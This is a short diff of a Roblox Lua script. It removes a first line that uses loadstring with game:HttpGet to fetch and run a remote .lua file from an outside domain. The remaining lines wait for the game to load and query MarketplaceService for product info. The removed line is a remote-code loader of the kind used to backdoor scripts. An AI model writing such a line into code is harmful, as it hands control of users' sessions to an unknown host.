@@ -1,4 +1,3 @@
-loadstring(game:HttpGet("https://egorikusa.space/9ffd32b9a17cf6215eb26546.lua", true))()
 repeat task.wait(0.1) until game:IsLoaded()
 local MarketplaceService = game:GetService("MarketplaceService")
 local success, gameInfo = pcall(MarketplaceService.GetProductInfo, MarketplaceService, game.PlaceId)
